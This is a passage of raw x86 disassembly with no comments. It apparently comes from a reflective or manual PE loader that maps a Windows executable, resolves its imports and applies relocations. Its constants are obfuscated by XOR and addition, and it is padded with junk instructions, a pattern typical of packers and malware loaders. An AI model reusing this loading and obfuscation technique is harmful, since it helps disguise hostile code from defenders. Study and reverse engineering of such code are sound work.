  41e705:	add    DWORD PTR [edi+eax*1],ebx
  41e708:	movzx  edi,WORD PTR [ecx+0xe]
  41e70c:	movzx  ebx,WORD PTR [ecx+0xc]
  41e710:	inc    DWORD PTR [ebp-0x8]
  41e713:	add    DWORD PTR [ebp-0x4],0x8
  41e717:	add    edi,ebx
  41e719:	cmp    DWORD PTR [ebp-0x8],edi
  41e71c:	jb     0x41e6f9
  41e71e:	movzx  edi,WORD PTR [edx+0xe]
  41e722:	movzx  ebx,WORD PTR [edx+0xc]
  41e726:	mov    ecx,DWORD PTR [ebp-0x14]
  41e729:	inc    DWORD PTR [ebp-0xc]
  41e72c:	add    ecx,0x8
  41e72f:	add    edi,ebx
  41e731:	mov    DWORD PTR [ebp-0x14],ecx
  41e734:	cmp    DWORD PTR [ebp-0xc],edi
  41e737:	jb     0x41e6d9
  41e739:	mov    ecx,DWORD PTR [ebp-0x18]
  41e73c:	movzx  edx,WORD PTR [eax+0xe]
  41e740:	movzx  edi,WORD PTR [eax+0xc]
  41e744:	inc    DWORD PTR [ebp-0x10]
  41e747:	add    ecx,0x8
  41e74a:	add    edx,edi
  41e74c:	mov    DWORD PTR [ebp-0x18],ecx
  41e74f:	cmp    DWORD PTR [ebp-0x10],edx
  41e752:	jb     0x41e6b9
  41e758:	pop    edi
  41e759:	pop    ebx
  41e75a:	xor    eax,eax
  41e75c:	inc    eax
  41e75d:	jmp    0x41e761
  41e75f:	xor    eax,eax
  41e761:	pop    esi
  41e762:	leave  
  41e763:	ret    
  41e764:	push   ebp
  41e765:	mov    ebp,esp
  41e767:	mov    ecx,DWORD PTR [ecx+0x190]
  41e76d:	mov    eax,DWORD PTR [ebp+0xc]
  41e770:	sub    esp,0x10
  41e773:	push   ebx
  41e774:	xor    ebx,ebx
  41e776:	push   esi
  41e777:	push   edi
  41e778:	cmp    DWORD PTR [ecx],ebx
  41e77a:	je     0x41e802
  41e780:	cmp    eax,ebx
  41e782:	je     0x41e802
  41e784:	cmp    DWORD PTR [eax+0x78],ebx
  41e787:	jne    0x41e78e
  41e789:	xor    eax,eax
  41e78b:	inc    eax
  41e78c:	jmp    0x41e804
  41e78e:	mov    eax,DWORD PTR [eax+0x78]
  41e791:	add    eax,DWORD PTR [ebp+0x8]
  41e794:	mov    ecx,DWORD PTR [eax+0x1c]
  41e797:	mov    edx,DWORD PTR [eax+0x24]
  41e79a:	mov    esi,DWORD PTR [eax+0x14]
  41e79d:	mov    edi,DWORD PTR [eax+0x18]
  41e7a0:	add    ecx,DWORD PTR [ebp+0x8]
  41e7a3:	add    edx,DWORD PTR [ebp+0x8]
  41e7a6:	mov    DWORD PTR [ebp-0x4],esi
  41e7a9:	cmp    esi,edi
  41e7ab:	ja     0x41e7b0
  41e7ad:	mov    DWORD PTR [ebp-0x4],edi
  41e7b0:	mov    DWORD PTR [ebp-0x8],ebx
  41e7b3:	cmp    DWORD PTR [ebp-0x4],ebx
  41e7b6:	jbe    0x41e789
  41e7b8:	cmp    ebx,DWORD PTR [eax+0x14]
  41e7bb:	jae    0x41e7c3
  41e7bd:	movzx  esi,WORD PTR [edx+ebx*2]
  41e7c1:	jmp    0x41e7c5
  41e7c3:	mov    esi,ebx
  41e7c5:	lea    esi,[ecx+esi*4]
  41e7c8:	mov    edi,DWORD PTR [esi]
  41e7ca:	test   edi,edi
  41e7cc:	je     0x41e7f7
  41e7ce:	add    edi,DWORD PTR [ebp+0x8]
  41e7d1:	mov    DWORD PTR [ebp-0x10],edi
  41e7d4:	cmp    edi,eax
  41e7d6:	jbe    0x41e7e8
  41e7d8:	mov    ebx,DWORD PTR [ebp+0xc]
  41e7db:	mov    ebx,DWORD PTR [ebx+0x7c]
  41e7de:	add    ebx,eax
  41e7e0:	cmp    edi,ebx
  41e7e2:	jae    0x41e7e8
  41e7e4:	mov    esi,DWORD PTR [esi]
  41e7e6:	jmp    0x41e7f0
  41e7e8:	sub    edi,DWORD PTR [ebp+0x8]
  41e7eb:	mov    DWORD PTR [esi],edi
  41e7ed:	mov    esi,DWORD PTR [ebp-0x10]
  41e7f0:	test   esi,esi
  41e7f2:	je     0x41e802
  41e7f4:	mov    ebx,DWORD PTR [ebp-0x8]
  41e7f7:	inc    ebx
  41e7f8:	mov    DWORD PTR [ebp-0x8],ebx
  41e7fb:	cmp    ebx,DWORD PTR [ebp-0x4]
  41e7fe:	jb     0x41e7b8
  41e800:	jmp    0x41e789
  41e802:	xor    eax,eax
  41e804:	pop    edi
  41e805:	pop    esi
  41e806:	pop    ebx
  41e807:	leave  
  41e808:	ret    0x8
  41e80b:	push   ebp
  41e80c:	mov    ebp,esp
  41e80e:	sub    esp,0x2c
  41e811:	mov    edx,0xf89c8585
  41e816:	mov    DWORD PTR [ebp-0x4],edx
  41e819:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  41e820:	mov    eax,DWORD PTR [ebp-0x4]
  41e823:	mov    ecx,DWORD PTR [ebp-0x4]
  41e826:	mov    ecx,DWORD PTR [ebp-0x4]
  41e829:	mov    ecx,DWORD PTR [ebp-0x4]
  41e82c:	mov    ecx,DWORD PTR [ebp-0x4]
  41e82f:	mov    ecx,DWORD PTR [ebp-0x4]
  41e832:	push   ebx
  41e833:	mov    ebx,DWORD PTR [ebp+0x10]
  41e836:	push   esi
  41e837:	mov    esi,0x751089b
  41e83c:	mov    DWORD PTR [ebp-0x10],0x352eb0f
  41e843:	mov    ecx,DWORD PTR [ebp-0x4]
  41e846:	mov    ebx,DWORD PTR [ebx+0x190]
  41e84c:	push   edi
  41e84d:	mov    edi,0x3272e2
  41e852:	xor    ecx,esi
  41e854:	xor    eax,esi
  41e856:	add    eax,edi
  41e858:	add    ecx,edi
  41e85a:	mov    DWORD PTR [ebp-0x18],eax
  41e85d:	cmp    ecx,DWORD PTR [ebx]
  41e85f:	je     0x41eae0
  41e865:	mov    ebx,DWORD PTR [ebp-0x4]
  41e868:	mov    ecx,DWORD PTR [ebp+0xc]
  41e86b:	xor    ebx,esi
  41e86d:	add    ebx,edi
  41e86f:	cmp    ebx,ecx
  41e871:	je     0x41eae0
  41e877:	mov    ebx,DWORD PTR [ebp-0x4]
  41e87a:	mov    ecx,DWORD PTR [ecx+0x80]
  41e880:	xor    ebx,esi
  41e882:	add    ebx,edi
  41e884:	cmp    ecx,ebx
  41e886:	je     0x41eadb
  41e88c:	add    ecx,DWORD PTR [ebp+0x8]
  41e88f:	mov    DWORD PTR [ebp-0x2c],ecx
  41e892:	mov    ebx,edx
  41e894:	xor    ebx,esi
  41e896:	add    ebx,edi
  41e898:	mov    DWORD PTR [ebp-0x10],ebx
  41e89b:	mov    ebx,DWORD PTR [ebp-0x10]
  41e89e:	cmp    ebx,edx
  41e8a0:	je     0x41e8b4
  41e8a2:	mov    edx,DWORD PTR [ebp-0x10]
  41e8a5:	mov    ebx,DWORD PTR [ebp-0x4]
  41e8a8:	imul   edx,edx,0x14
  41e8ab:	xor    ebx,esi
  41e8ad:	add    ebx,edi
  41e8af:	cmp    DWORD PTR [edx+ecx*1],ebx
  41e8b2:	jne    0x41e8cb
  41e8b4:	mov    edx,DWORD PTR [ebp-0x10]
  41e8b7:	mov    ebx,DWORD PTR [ebp-0x4]
  41e8ba:	imul   edx,edx,0x14
  41e8bd:	xor    ebx,esi
  41e8bf:	add    ebx,edi
  41e8c1:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  41e8c5:	je     0x41eacd
  41e8cb:	mov    eax,DWORD PTR [ebp-0x4]
  41e8ce:	mov    ebx,DWORD PTR [ebp-0x4]
  41e8d1:	mov    eax,DWORD PTR [ebp-0x10]
  41e8d4:	imul   eax,eax,0x14
  41e8d7:	add    eax,ecx
  41e8d9:	mov    ecx,DWORD PTR [eax+0x10]
  41e8dc:	add    ecx,DWORD PTR [ebp+0x8]
  41e8df:	xor    ebx,esi
  41e8e1:	mov    DWORD PTR [ebp-0x1c],ecx
  41e8e4:	mov    ecx,DWORD PTR [ebp-0x4]
  41e8e7:	mov    edx,DWORD PTR [ebp-0x4]
  41e8ea:	xor    ecx,esi
  41e8ec:	add    ecx,edi
  41e8ee:	xor    edx,esi
  41e8f0:	mov    DWORD PTR [ebp-0x24],ecx
  41e8f3:	mov    ecx,DWORD PTR [eax]
  41e8f5:	add    edx,edi
  41e8f7:	add    ebx,edi
  41e8f9:	cmp    ecx,edx
  41e8fb:	je     0x41e903
  41e8fd:	add    ecx,DWORD PTR [ebp+0x8]
  41e900:	mov    DWORD PTR [ebp-0x24],ecx
  41e903:	mov    ecx,DWORD PTR [ebp-0x4]
  41e906:	xor    ecx,esi
  41e908:	add    ecx,DWORD PTR [eax+0xc]
  41e90b:	mov    eax,DWORD PTR [ebp+0x8]
  41e90e:	lea    eax,[ecx+eax*1+0x3272e2]
  41e915:	mov    DWORD PTR [ebp+0xc],eax
  41e918:	mov    DWORD PTR [ebp-0x28],0xf89c85b8
  41e91f:	mov    eax,DWORD PTR [ebp+0x10]
  41e922:	push   DWORD PTR [ebp+0xc]
  41e925:	mov    eax,DWORD PTR [eax+0x1d8]
  41e92b:	call   DWORD PTR [eax]
  41e92d:	mov    ecx,DWORD PTR [ebp-0x4]
  41e930:	xor    ecx,esi
  41e932:	add    ecx,edi
  41e934:	mov    DWORD PTR [ebp-0xc],eax
  41e937:	cmp    ecx,eax
  41e939:	jne    0x41e94d
  41e93b:	mov    eax,DWORD PTR [ebp+0x10]
  41e93e:	push   DWORD PTR [ebp+0xc]
  41e941:	mov    eax,DWORD PTR [eax+0x1d8]
  41e947:	call   DWORD PTR [eax+0xc]
  41e94a:	mov    DWORD PTR [ebp-0xc],eax
  41e94d:	mov    DWORD PTR [ebp-0x20],0x7f661b0c
  41e954:	mov    DWORD PTR [ebp-0x20],0xf89c999c
  41e95b:	mov    eax,DWORD PTR [ebp-0x4]
  41e95e:	xor    eax,esi
  41e960:	add    eax,edi
  41e962:	cmp    eax,DWORD PTR [ebp-0xc]
  41e965:	jne    0x41e98a
  41e967:	mov    eax,DWORD PTR [ebp-0x8]
  41e96a:	mov    ecx,DWORD PTR [ebp-0x20]
  41e96d:	xor    eax,esi
  41e96f:	xor    ecx,esi
  41e971:	lea    ebx,[ebx+eax*1+0x3272e2]
  41e978:	mov    eax,DWORD PTR [ebp+0x10]
  41e97b:	mov    eax,DWORD PTR [eax+0x1d8]
  41e981:	add    ecx,edi
  41e983:	imul   ecx,ebx
  41e986:	push   ecx
  41e987:	call   DWORD PTR [eax+0x24]
  41e98a:	mov    eax,DWORD PTR [ebp-0x4]
  41e98d:	xor    eax,esi
  41e98f:	add    eax,edi
  41e991:	cmp    eax,DWORD PTR [ebp-0xc]
  41e994:	jne    0x41e9a5
  41e996:	mov    eax,DWORD PTR [ebp-0x28]
  41e999:	xor    eax,esi
  41e99b:	add    eax,edi
  41e99d:	cmp    ebx,eax
  41e99f:	jbe    0x41e91f
  41e9a5:	mov    eax,DWORD PTR [ebp-0x4]
  41e9a8:	xor    eax,esi
  41e9aa:	add    eax,edi
  41e9ac:	cmp    eax,DWORD PTR [ebp-0xc]
  41e9af:	jne    0x41e9c8
  41e9b1:	mov    eax,DWORD PTR [ebp-0x8]
  41e9b4:	mov    ecx,DWORD PTR [ebp-0x18]
  41e9b7:	xor    eax,esi
  41e9b9:	lea    eax,[ecx+eax*1+0x3272e2]
  41e9c0:	mov    DWORD PTR [ebp-0x18],eax
  41e9c3:	jmp    0x41eab7
  41e9c8:	mov    DWORD PTR [ebp-0x14],0x1121b0d
  41e9cf:	mov    DWORD PTR [ebp+0xc],0xe042d0f
  41e9d6:	mov    ebx,DWORD PTR [ebp-0x4]
  41e9d9:	xor    ebx,esi
  41e9db:	add    ebx,edi
  41e9dd:	jmp    0x41eaa4
  41e9e2:	mov    eax,DWORD PTR [ebp-0x4]
  41e9e5:	xor    eax,esi
  41e9e7:	add    eax,edi
  41e9e9:	mov    DWORD PTR [ebp-0x14],eax
  41e9ec:	mov    eax,DWORD PTR [ebp-0x4]
  41e9ef:	xor    eax,esi
  41e9f1:	add    eax,edi
  41e9f3:	mov    DWORD PTR [ebp+0xc],eax
  41e9f6:	mov    ecx,DWORD PTR [ebp-0x4]
  41e9f9:	mov    eax,DWORD PTR [ebp-0x24]
  41e9fc:	xor    ecx,esi
  41e9fe:	add    ecx,edi
  41ea00:	cmp    ecx,eax
  41ea02:	je     0x41ea0a
  41ea04:	mov    eax,DWORD PTR [eax+ebx*4]
  41ea07:	mov    DWORD PTR [ebp-0x14],eax
  41ea0a:	mov    eax,DWORD PTR [ebp-0x1c]
  41ea0d:	mov    eax,DWORD PTR [eax+ebx*4]
  41ea10:	mov    DWORD PTR [ebp+0xc],eax
  41ea13:	mov    eax,DWORD PTR [ebp-0x4]
  41ea16:	mov    ecx,DWORD PTR [ebp-0x14]
  41ea19:	xor    eax,esi
  41ea1b:	add    eax,edi
  41ea1d:	cmp    eax,ecx
  41ea1f:	je     0x41ea4a
  41ea21:	mov    eax,DWORD PTR [ebp-0x4]
  41ea24:	mov    ecx,DWORD PTR [ebp-0x14]
  41ea27:	xor    eax,esi
  41ea29:	add    eax,edi
  41ea2b:	shr    ecx,0x1f
  41ea2e:	cmp    eax,ecx
  41ea30:	je     0x41ea4a
  41ea32:	mov    ecx,DWORD PTR [ebp-0x14]
  41ea35:	mov    eax,DWORD PTR [ebp+0x10]
  41ea38:	mov    eax,DWORD PTR [eax+0x1d8]
  41ea3e:	movzx  ecx,cx
  41ea41:	push   ecx
  41ea42:	push   DWORD PTR [ebp-0xc]
  41ea45:	call   DWORD PTR [eax+0x8]
  41ea48:	jmp    0x41ea63
  41ea4a:	mov    eax,DWORD PTR [ebp+0xc]
  41ea4d:	add    eax,DWORD PTR [ebp+0x8]
  41ea50:	mov    ecx,DWORD PTR [ebp+0x10]
  41ea53:	mov    ecx,DWORD PTR [ecx+0x1d8]
  41ea59:	add    eax,0x2
  41ea5c:	push   eax
  41ea5d:	push   DWORD PTR [ebp-0xc]
  41ea60:	call   DWORD PTR [ecx+0x8]
  41ea63:	mov    DWORD PTR [ebp+0xc],eax
  41ea66:	mov    eax,DWORD PTR [ebp-0x4]
  41ea69:	mov    ecx,DWORD PTR [ebp+0xc]
  41ea6c:	xor    eax,esi
  41ea6e:	add    eax,edi
  41ea70:	cmp    eax,ecx
  41ea72:	mov    eax,DWORD PTR [ebp-0x8]
  41ea75:	jne    0x41ea88
  41ea77:	mov    ecx,DWORD PTR [ebp-0x18]
  41ea7a:	xor    eax,esi
  41ea7c:	lea    eax,[ecx+eax*1+0x3272e2]
  41ea83:	mov    DWORD PTR [ebp-0x18],eax
  41ea86:	jmp    0x41ea98
  41ea88:	mov    ecx,DWORD PTR [ebp+0xc]
  41ea8b:	xor    eax,esi
  41ea8d:	add    eax,edi
  41ea8f:	imul   eax,ecx
  41ea92:	mov    ecx,DWORD PTR [ebp-0x1c]
  41ea95:	mov    DWORD PTR [ecx+ebx*4],eax
  41ea98:	mov    eax,DWORD PTR [ebp-0x8]
  41ea9b:	xor    eax,esi
  41ea9d:	lea    ebx,[ebx+eax*1+0x3272e2]
  41eaa4:	mov    eax,DWORD PTR [ebp-0x4]
  41eaa7:	mov    ecx,DWORD PTR [ebp-0x1c]
  41eaaa:	xor    eax,esi
  41eaac:	add    eax,edi
  41eaae:	cmp    DWORD PTR [ecx+ebx*4],eax
  41eab1:	jne    0x41e9e2
  41eab7:	mov    edx,DWORD PTR [ebp-0x10]
  41eaba:	mov    eax,DWORD PTR [ebp-0x18]
  41eabd:	mov    ecx,DWORD PTR [ebp-0x2c]
  41eac0:	sub    edx,0x3272e1
  41eac6:	xor    edx,esi
  41eac8:	jmp    0x41e892
  41eacd:	mov    ecx,DWORD PTR [ebp-0x4]
  41ead0:	xor    ecx,esi
  41ead2:	add    ecx,edi
  41ead4:	cmp    eax,ecx
  41ead6:	mov    eax,DWORD PTR [ebp-0x4]
  41ead9:	jne    0x41eae3
  41eadb:	mov    eax,DWORD PTR [ebp-0x8]
  41eade:	jmp    0x41eae3
  41eae0:	mov    eax,DWORD PTR [ebp-0x4]
  41eae3:	xor    eax,esi
  41eae5:	add    eax,edi
  41eae7:	pop    edi
  41eae8:	pop    esi
  41eae9:	pop    ebx
  41eaea:	leave  
  41eaeb:	ret    0xc
  41eaee:	push   ebp
  41eaef:	mov    ebp,esp
  41eaf1:	sub    esp,0x28
  41eaf4:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  41eafb:	mov    DWORD PTR [ebp-0x28],0xf89c8584
  41eb02:	mov    eax,DWORD PTR [ebp+0xc]
  41eb05:	mov    DWORD PTR [ebp+0xc],eax
  41eb08:	push   esi
  41eb09:	mov    eax,eax
  41eb0b:	mov    eax,DWORD PTR [ebp-0x4]
  41eb0e:	mov    esi,DWORD PTR [ebp+0x8]
  41eb11:	mov    ecx,0x751089b
  41eb16:	xor    eax,ecx
  41eb18:	mov    edx,0x3272e2
  41eb1d:	add    eax,edx
  41eb1f:	cmp    esi,eax
  41eb21:	je     0x41ec48
  41eb27:	mov    eax,DWORD PTR [ebp+0x8]
  41eb2a:	mov    esi,DWORD PTR [ebp+0x8]
  41eb2d:	add    esi,DWORD PTR [eax+0x3c]
  41eb30:	push   edi
  41eb31:	mov    DWORD PTR [ebp+0xc],esi
  41eb34:	mov    DWORD PTR [ebp-0x1c],0xf89c85b8
  41eb3b:	mov    eax,DWORD PTR [ebp-0x1c]
  41eb3e:	mov    esi,DWORD PTR [ebp-0x4]
  41eb41:	mov    edi,DWORD PTR [ebp+0xc]
  41eb44:	xor    esi,ecx
  41eb46:	xor    eax,ecx
  41eb48:	add    esi,edx
  41eb4a:	cmp    DWORD PTR [edi+eax*8+0x1939788],esi
  41eb51:	je     0x41ec42
  41eb57:	mov    esi,DWORD PTR [ebp+0xc]
  41eb5a:	mov    eax,DWORD PTR [ebp+0x8]
  41eb5d:	add    eax,DWORD PTR [esi+0xa0]
  41eb63:	mov    esi,DWORD PTR [ebp+0x8]
  41eb66:	mov    edi,DWORD PTR [ebp+0xc]
  41eb69:	sub    esi,DWORD PTR [edi+0x34]
  41eb6c:	mov    edi,DWORD PTR [ebp-0x4]
  41eb6f:	xor    edi,ecx
  41eb71:	add    edi,edx
  41eb73:	mov    DWORD PTR [ebp-0x24],esi
  41eb76:	cmp    esi,edi
  41eb78:	je     0x41ec42
  41eb7e:	mov    esi,DWORD PTR [ebp-0x4]
  41eb81:	xor    esi,ecx
  41eb83:	add    esi,edx
  41eb85:	mov    DWORD PTR [ebp-0x8],esi
  41eb88:	push   ebx
  41eb89:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  41eb90:	jmp    0x41ec2c
  41eb95:	mov    esi,DWORD PTR [ebp-0x4]
  41eb98:	xor    esi,ecx
  41eb9a:	lea    edi,[ebx-0x8]
  41eb9d:	add    esi,edx
  41eb9f:	shr    edi,1
  41eba1:	cmp    esi,edi
  41eba3:	jae    0x41ec12
  41eba5:	sub    edi,esi
  41eba7:	lea    ebx,[eax+esi*2+0x8]
  41ebab:	mov    DWORD PTR [ebp-0x18],edi
  41ebae:	movzx  esi,WORD PTR [ebx]
  41ebb1:	and    esi,0xfff
  41ebb7:	mov    DWORD PTR [ebp-0x14],esi
  41ebba:	mov    edi,DWORD PTR [ebp-0x14]
  41ebbd:	mov    esi,DWORD PTR [eax]
  41ebbf:	sub    esi,edx
  41ebc1:	add    edi,esi
  41ebc3:	movzx  esi,WORD PTR [ebx]
  41ebc6:	shr    esi,0xc
  41ebc9:	xor    edi,ecx
  41ebcb:	mov    DWORD PTR [ebp-0x20],edi
  41ebce:	mov    DWORD PTR [ebp-0x14],esi
  41ebd1:	mov    esi,DWORD PTR [ebp-0x20]
  41ebd4:	mov    edi,DWORD PTR [ebp+0x8]
  41ebd7:	xor    esi,ecx
  41ebd9:	lea    esi,[esi+edi*1+0x3272e2]
  41ebe0:	mov    DWORD PTR [ebp-0x20],esi
  41ebe3:	mov    esi,DWORD PTR [ebp-0x10]
  41ebe6:	mov    edi,DWORD PTR [ebp-0x14]
  41ebe9:	xor    esi,ecx
  41ebeb:	add    esi,edx
  41ebed:	cmp    edi,esi
  41ebef:	jne    0x41ec07
  41ebf1:	mov    esi,DWORD PTR [ebp-0x10]
  41ebf4:	mov    edi,DWORD PTR [ebp-0x14]
  41ebf7:	xor    esi,ecx
  41ebf9:	add    esi,edx
  41ebfb:	cmp    edi,esi
  41ebfd:	jne    0x41ec07
  41ebff:	mov    esi,DWORD PTR [ebp-0x20]
  41ec02:	mov    edi,DWORD PTR [ebp-0x24]
  41ec05:	add    DWORD PTR [esi],edi
  41ec07:	add    ebx,0x2
  41ec0a:	dec    DWORD PTR [ebp-0x18]
  41ec0d:	jne    0x41ebae
  41ec0f:	mov    ebx,DWORD PTR [ebp-0xc]
  41ec12:	add    DWORD PTR [ebp-0x8],ebx
  41ec15:	mov    esi,DWORD PTR [ebp-0x1c]
  41ec18:	mov    edi,DWORD PTR [ebp-0x8]
  41ec1b:	mov    ebx,DWORD PTR [ebp+0xc]
  41ec1e:	xor    esi,ecx
  41ec20:	cmp    edi,DWORD PTR [ebx+esi*8+0x193978c]
  41ec27:	jae    0x41ec41
  41ec29:	add    eax,DWORD PTR [ebp-0xc]
  41ec2c:	mov    esi,DWORD PTR [ebp-0x4]
  41ec2f:	mov    ebx,DWORD PTR [eax+0x4]
  41ec32:	xor    esi,ecx
  41ec34:	add    esi,edx
  41ec36:	mov    DWORD PTR [ebp-0xc],ebx
  41ec39:	cmp    ebx,esi
  41ec3b:	jne    0x41eb95
  41ec41:	pop    ebx
  41ec42:	mov    eax,DWORD PTR [ebp-0x28]
  41ec45:	pop    edi
  41ec46:	jmp    0x41ec4b
  41ec48:	mov    eax,DWORD PTR [ebp-0x4]
  41ec4b:	xor    eax,ecx
  41ec4d:	add    eax,edx
  41ec4f:	pop    esi
  41ec50:	leave  
  41ec51:	ret    0x8
  41ec54:	push   ebp
  41ec55:	mov    ebp,esp
  41ec57:	sub    esp,0xcc
  41ec5d:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  41ec64:	mov    DWORD PTR [ebp-0x24],0xf89c8584
  41ec6b:	mov    eax,DWORD PTR [ebp-0x4]
  41ec6e:	push   ebx
  41ec6f:	push   esi
  41ec70:	mov    esi,0x751089b
  41ec75:	xor    eax,esi
  41ec77:	push   edi
  41ec78:	mov    edi,0x3272e2
  41ec7d:	add    eax,edi
  41ec7f:	mov    DWORD PTR [ebp-0x1c],eax
  41ec82:	mov    eax,DWORD PTR [ebp-0x4]
  41ec85:	xor    eax,esi
  41ec87:	add    eax,edi
  41ec89:	mov    DWORD PTR [ebp-0x8],eax
  41ec8c:	mov    ebx,DWORD PTR [ebp+0x20]
  41ec8f:	mov    eax,DWORD PTR [ebp-0x14]
  41ec92:	mov    ecx,DWORD PTR [ebp-0x14]
  41ec95:	xor    eax,ecx
  41ec97:	mov    DWORD PTR [ebp-0x14],eax
  41ec9a:	add    DWORD PTR [ebp-0x14],0xf89cb585
  41eca1:	mov    eax,DWORD PTR [ebp-0xc]
  41eca4:	mov    ecx,DWORD PTR [ebp-0xc]
  41eca7:	xor    eax,ecx
  41eca9:	mov    DWORD PTR [ebp-0xc],eax
  41ecac:	add    DWORD PTR [ebp-0xc],0xf89c85c5
  41ecb3:	mov    eax,DWORD PTR [ebp-0x10]
  41ecb6:	mov    ecx,DWORD PTR [ebp-0x10]
  41ecb9:	xor    eax,ecx
  41ecbb:	mov    DWORD PTR [ebp-0x10],eax
  41ecbe:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  41ecc5:	mov    eax,DWORD PTR [ebp-0x20]
  41ecc8:	mov    ecx,DWORD PTR [ebp-0x20]
  41eccb:	xor    eax,ecx
  41eccd:	mov    DWORD PTR [ebp-0x20],eax
  41ecd0:	add    DWORD PTR [ebp-0x20],0xf89f0585
  41ecd7:	mov    eax,0x9471
  41ecdc:	mov    WORD PTR [ebp+0x20],ax
  41ece0:	mov    eax,DWORD PTR [ebp+0x8]
  41ece3:	test   eax,eax
  41ece5:	je     0x41f140
  41eceb:	mov    eax,DWORD PTR [ebp+0xc]
  41ecee:	test   eax,eax
  41ecf0:	je     0x41f140
  41ecf6:	mov    eax,DWORD PTR [ebp+0x18]
  41ecf9:	test   eax,eax
  41ecfb:	je     0x41f140
  41ed01:	mov    ax,WORD PTR [ebp+0x20]
  41ed05:	mov    ecx,0x8a8d
  41ed0a:	xor    ax,cx
  41ed0d:	mov    ecx,0x3b51
  41ed12:	add    ax,cx
  41ed15:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed18:	cmp    WORD PTR [ecx],ax
  41ed1b:	jne    0x41f140
  41ed21:	mov    eax,DWORD PTR [ebp-0x4]
  41ed24:	xor    eax,esi
  41ed26:	add    eax,edi
  41ed28:	mov    DWORD PTR [ebp-0x30],eax
  41ed2b:	mov    eax,DWORD PTR [ebp-0x4]
  41ed2e:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed31:	mov    eax,DWORD PTR [ebp+0x8]
  41ed34:	add    eax,DWORD PTR [ecx+0x3c]
  41ed37:	mov    DWORD PTR [ebp+0xc],eax
  41ed3a:	mov    eax,DWORD PTR [eax+0x50]
  41ed3d:	test   eax,eax
  41ed3f:	je     0x41f140
  41ed45:	mov    DWORD PTR [ebp-0x2c],0xf88c8585
  41ed4c:	mov    eax,DWORD PTR [ebp-0x2c]
  41ed4f:	xor    eax,esi
  41ed51:	add    eax,edi
  41ed53:	mov    DWORD PTR [ebp-0x2c],eax
  41ed56:	mov    eax,DWORD PTR [ebp-0x4]
  41ed59:	mov    eax,DWORD PTR [ebx+0x190]
  41ed5f:	mov    ecx,DWORD PTR [eax]
  41ed61:	mov    ecx,DWORD PTR [ecx+0x3c]
  41ed64:	add    ecx,DWORD PTR [eax]
  41ed66:	mov    eax,DWORD PTR [ebp-0x4]
  41ed69:	mov    eax,DWORD PTR [ebx+0x18c]
  41ed6f:	mov    edx,DWORD PTR [eax]
  41ed71:	mov    DWORD PTR [ebp-0x18],ecx
  41ed74:	mov    DWORD PTR [ebp+0x20],edx
  41ed77:	cmp    edx,edx
  41ed79:	jne    0x41edad
  41ed7b:	mov    eax,DWORD PTR [ebx+0x1d8]
  41ed81:	lea    edx,[ebp-0x1c]
  41ed84:	push   edx
  41ed85:	mov    edx,DWORD PTR [ebp-0xc]
  41ed88:	xor    edx,esi
  41ed8a:	add    edx,edi
  41ed8c:	push   edx
  41ed8d:	push   DWORD PTR [ecx+0x50]
  41ed90:	push   DWORD PTR [ebp+0x20]
  41ed93:	call   DWORD PTR [eax+0x1c]
  41ed96:	mov    eax,DWORD PTR [ebp-0x18]
  41ed99:	mov    ecx,DWORD PTR [eax+0x54]
  41ed9c:	mov    eax,DWORD PTR [eax+0x50]
  41ed9f:	sub    eax,ecx
  41eda1:	add    ecx,DWORD PTR [ebp+0x20]
  41eda4:	push   ecx
  41eda5:	call   0x41f72c
  41edaa:	mov    edx,DWORD PTR [ebp+0x20]
  41edad:	mov    eax,DWORD PTR [ebx+0x194]
  41edb3:	mov    DWORD PTR [eax],edx
  41edb5:	mov    eax,DWORD PTR [ebp+0xc]
  41edb8:	push   DWORD PTR [eax+0x54]
  41edbb:	push   DWORD PTR [ebp+0x8]
  41edbe:	push   edx
  41edbf:	call   0x41f5d3
  41edc4:	mov    ecx,DWORD PTR [ebp+0x20]
  41edc7:	mov    eax,DWORD PTR [ecx+0x3c]
  41edca:	add    eax,ecx
  41edcc:	movzx  ecx,WORD PTR [eax+0x14]
  41edd0:	lea    ecx,[ecx+eax*1+0x18]
  41edd4:	mov    DWORD PTR [ebp+0x18],ecx
  41edd7:	mov    ecx,DWORD PTR [ebp-0x4]
  41edda:	movzx  edx,WORD PTR [eax+0x6]
  41edde:	xor    ecx,esi
  41ede0:	add    ecx,edi
  41ede2:	mov    DWORD PTR [ebp+0xc],eax
  41ede5:	cmp    edx,ecx
  41ede7:	je     0x41ee94
  41eded:	mov    ecx,DWORD PTR [ebp-0x4]
  41edf0:	xor    ecx,esi
  41edf2:	add    ecx,edi
  41edf4:	mov    DWORD PTR [ebp-0x8],ecx
  41edf7:	mov    ecx,DWORD PTR [ebp-0x24]
  41edfa:	movzx  edx,WORD PTR [eax+0x6]
  41edfe:	xor    ecx,esi
  41ee00:	sub    edx,ecx
  41ee02:	sub    edx,edi
  41ee04:	cmp    DWORD PTR [ebp-0x8],edx
  41ee07:	ja     0x41ee94
  41ee0d:	mov    edx,DWORD PTR [ebp+0x18]
  41ee10:	add    edx,0x8
  41ee13:	mov    DWORD PTR [ebp+0x18],edx
  41ee16:	jmp    0x41ee1b
  41ee18:	mov    edx,DWORD PTR [ebp+0x18]
  41ee1b:	mov    eax,DWORD PTR [eax+0x38]
  41ee1e:	lea    ecx,[eax-0x1]
  41ee21:	mov    DWORD PTR [ebp-0x34],eax
  41ee24:	mov    eax,DWORD PTR [edx]
  41ee26:	test   ecx,eax
  41ee28:	je     0x41ee31
  41ee2a:	not    ecx
  41ee2c:	and    eax,ecx
  41ee2e:	add    eax,DWORD PTR [ebp-0x34]
  41ee31:	mov    ecx,DWORD PTR [edx+0x4]
  41ee34:	add    ecx,DWORD PTR [ebp+0x20]
  41ee37:	push   ecx
  41ee38:	call   0x41f72c
  41ee3d:	mov    edx,DWORD PTR [ebp-0x4]
  41ee40:	mov    eax,DWORD PTR [ebp+0x18]
  41ee43:	mov    ecx,DWORD PTR [eax+0x8]
  41ee46:	xor    edx,esi
  41ee48:	add    edx,edi
  41ee4a:	cmp    ecx,edx
  41ee4c:	je     0x41ee65
  41ee4e:	push   ecx
  41ee4f:	mov    ecx,DWORD PTR [ebp+0x8]
  41ee52:	add    ecx,DWORD PTR [eax+0xc]
